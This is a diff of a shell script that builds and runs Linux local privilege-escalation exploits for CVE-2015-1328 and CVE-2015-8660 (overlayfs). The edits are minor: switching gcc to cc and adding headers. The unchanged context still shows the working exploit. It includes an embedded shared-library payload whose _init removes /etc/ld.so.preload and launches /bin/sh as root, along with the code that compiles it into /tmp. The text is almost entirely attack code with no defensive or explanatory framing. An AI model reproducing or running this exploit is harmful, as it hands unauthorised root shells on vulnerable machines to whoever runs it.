@@ -5,11 +5,11 @@ TMP_DIR="/tmp"
 CVE_2015_1328_SRC="cve-2015-1328.c"
 CVE_2015_8660_SRC="cve-2015-8660.c"
 OFS_LIB_SRC="ofs-lib.c"
-COMPILER=$(which gcc)
+COMPILER=$(which cc)
 
-# Check if gcc is installed
+# Check if cc is installed
 if [[ -z "$COMPILER" ]]; then
-  echo "gcc is not installed. Exiting."
+  echo "cc is not installed. Exiting."
   exit 1
 fi
 
@@ -82,6 +82,7 @@ compile_and_run_exploit() {
 #include <linux/fs.h>
 #include <sys/syscall.h>
 #include <string.h>
+#include <errno.h>
 
 #define LIB "#define _GNU_SOURCE\\n\\n#include <dlfcn.h>\\n#include <stdio.h>\\n#include <stdlib.h>\\n#include <sys/types.h>\\n#include <sys/stat.h>\\n#include <fcntl.h>\\n#include <unistd.h>\\n\\nvoid _init() {\\n\\tunlink(\\\"/etc/ld.so.preload\\\");\\n\\tsystem(\\\"/bin/sh\\\");\\n}\\n"
 
@@ -89,6 +90,7 @@ int main(int argc, char *argv[])
 {
   char buf[4096];
   int fdo, fds;
+  struct stat st;
 
   printf("[+] preparing library\\n");
   fdo = open("/tmp/ofs-lib.c", O_WRONLY|O_CREAT, 0600);
@@ -100,7 +102,7 @@ int main(int argc, char *argv[])
   close(fdo);
 
   printf("[+] compiling library\\n");
-  system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -nostartfiles");
+  system("cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -nostartfiles");
 
   fdo = open("/proc/self/exe", O_RDONLY);
   if (fdo < 0) {
@@ -203,7 +205,7 @@ EOF
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <sys/mount.h>
+#include <sys/mman.h>
 #include <sys/stat.h>
 #include <sys/syscall.h>
 #include <sys/types.h>
